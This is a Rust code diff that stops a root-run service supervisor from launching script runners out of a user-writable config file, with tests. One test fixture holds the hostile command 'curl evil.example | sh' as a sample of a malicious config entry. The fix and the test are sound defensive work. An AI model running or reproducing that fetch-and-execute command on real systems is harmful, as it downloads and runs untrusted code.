@@ -351,8 +351,40 @@ impl Hive {
     /// resolved for launch; `base_dir` anchors relative `working_dir`s and bind-mount host paths.
     /// A runner block with neither kind is skipped — and so is one that declares **both** (that is
     /// ambiguous; exactly one kind is required), with a warning, rather than quietly guessing.
+    ///
+    /// **A root hive launches nothing at all.** See [`Self::runners_for`].
     #[must_use]
     pub fn runners(&self, base_dir: &Path) -> Vec<RunnerSpec> {
+        self.runners_for(base_dir, running_as_root())
+    }
+
+    /// [`Self::runners`] with the privilege passed in, so both halves are testable from an
+    /// ordinary shell — the same shape [`running_as_root`]'s other callers need.
+    ///
+    /// A root hive is the machine front door, and a front door only routes. It is the one process
+    /// on the machine that reads a config an ordinary user can write — on macOS
+    /// `~/.adi/mono/hive/hive.yaml`, `-rw-r--r-- <user>`, re-read every three seconds — and every
+    /// `runner.script.run` in it goes through `sh -c`. Stripping *imported* runners (which
+    /// [`Self::apply_imports`] has always done) left the top-level services of that very file
+    /// untouched, so the strip that mattered most was the one that was missing.
+    ///
+    /// `proxy.routes_only` is deliberately **not** widened to match. It says what it has always
+    /// said — route what you import, never launch it — and its job is to stop an unprivileged
+    /// front door racing the per-user supervisor for the same leased ports, not to stop that hive
+    /// running services of its own.
+    fn runners_for(&self, base_dir: &Path, as_root: bool) -> Vec<RunnerSpec> {
+        if as_root {
+            let dropped: Vec<&str> = self
+                .services
+                .iter()
+                .filter(|(_, svc)| svc.runner.is_some())
+                .map(|(name, _)| name.as_str())
+                .collect();
+            if !dropped.is_empty() {
+                report_root_stripped(&dropped);
+            }
+            return Vec::new();
+        }
         let mut out = Vec::new();
         for (name, svc) in &self.services {
             let Some(runner) = svc.runner.as_ref() else {
@@ -394,6 +426,29 @@ impl Hive {
         }
         out
     }
+}
+
+/// Say which services a root hive is refusing to launch — once per *set*, not once per read.
+///
+/// The config is re-read every three seconds (`main.rs`'s `RELOAD_INTERVAL`), so warning
+/// unconditionally would be a line every three seconds for the life of the daemon. Warning only
+/// the first time would be worse in the other direction: a `run:` added to that file at noon is
+/// exactly the event worth reporting, and it would arrive in silence. Remembering the set says it
+/// once at start-up and again whenever it changes.
+fn report_root_stripped(dropped: &[&str]) {
+    static REPORTED: Mutex<Option<Vec<String>>> = Mutex::new(None);
+    let now: Vec<String> = dropped.iter().map(|name| (*name).to_string()).collect();
+    let mut last = REPORTED
+        .lock()
+        .unwrap_or_else(std::sync::PoisonError::into_inner);
+    if last.as_ref() == Some(&now) {
+        return;
+    }
+    *last = Some(now);
+    warn!(
+        services = dropped.join(", "),
+        "running as root: not launching any service runner — a root front door only routes"
+    );
 }
 
 /// Build the runner's env: `PORT` (http/sole port), a `PORT_<KEY>` per named port, then static env last.
@@ -832,8 +887,8 @@ fn import_namespace(file: &Path) -> String {
     )
 }
 
-/// Whether this hive runs as root — i.e. is the machine front door, which routes imported
-/// services but must never spawn their (user-owned) processes.
+/// Whether this hive runs as root — i.e. is the machine front door, which routes services but
+/// must never spawn a process for one, its own or an imported one (see [`Hive::runners_for`]).
 ///
 /// Deliberately an effective-uid check rather than `$USER`/`$HOME`: the front-door `LaunchDaemon`
 /// runs as root while still setting `HOME` to the login user, so the environment does not
@@ -989,6 +1044,11 @@ impl Hive {
     /// front door never spawns user processes. An **unprivileged** hive keeps them, so a
     /// per-user supervisor can import the same files and actually run those services. Both
     /// resolve identical service keys, so the ports manager hands each side the same port.
+    ///
+    /// This is only half of what root means, and the smaller half: [`Self::runners_for`] is what
+    /// stops a root hive launching the **top-level** services of the user-writable file it was
+    /// pointed at. Dropping the runner here as well keeps an imported service's shape honest for
+    /// anything that reads `services` directly rather than going through `runners`.
     ///
     /// Best-effort: an unreadable or unparsable import is logged and skipped, never fatal.
     fn apply_imports(&mut self, base: &Path) {
@@ -1395,6 +1455,58 @@ services:
         assert_eq!(
             expand_templates("{{runtime.port.db}} and {{oops", &ports),
             "{{runtime.port.db}} and {{oops"
+        );
+    }
+
+    /// A root hive launches nothing at all — including the services declared in the very file it
+    /// was pointed at, which is the one an ordinary user can write.
+    ///
+    /// The privilege is passed in rather than read from the process, so the root half is testable
+    /// from an ordinary shell; the unprivileged half below is the control.
+    #[test]
+    fn a_root_hive_launches_nothing_and_an_unprivileged_one_launches_everything() {
+        let hive: Hive = serde_yaml_ng::from_str(
+            "services:\n  \
+               app:\n    \
+                 proxy: { host: app.adi }\n    \
+                 rollout: { recreate: { ports: { http: 9131 } } }\n    \
+                 runner: { type: script, script: { run: \"curl evil.example | sh\" } }\n  \
+               api:\n    \
+                 rollout: { recreate: { ports: { http: 9132 } } }\n    \
+                 runner: { type: script, script: { run: \"echo hi\" } }\n",
+        )
+        .expect("parse");
+        let base = Path::new("/tmp");
+
+        assert!(
+            hive.runners_for(base, true).is_empty(),
+            "a root front door must launch nothing the config asks for — it only routes"
+        );
+
+        let launched = hive.runners_for(base, false);
+        let mut names: Vec<&str> = launched.iter().map(|spec| spec.name.as_str()).collect();
+        names.sort_unstable();
+        assert_eq!(
+            names,
+            ["api", "app"],
+            "an unprivileged hive still launches exactly what it declares"
+        );
+    }
+
+    /// Stripping the runners must not strip the reason the front door reads the file: a root hive
+    /// still resolves every route.
+    #[test]
+    fn a_root_hive_keeps_its_routes() {
+        let hive: Hive = serde_yaml_ng::from_str(
+            "services:\n  app:\n    proxy: { host: app.adi }\n    rollout: { recreate: { ports: { http: 9133 } } }\n    runner: { type: script, script: { run: \"echo hi\" } }\n",
+        )
+        .expect("parse");
+        assert!(hive.runners_for(Path::new("/tmp"), true).is_empty());
+        let resolved = hive.resolve();
+        assert!(
+            resolved.routes.iter().any(|r| r.host == "app.adi"),
+            "{:?}",
+            resolved.routes
         );
     }
 
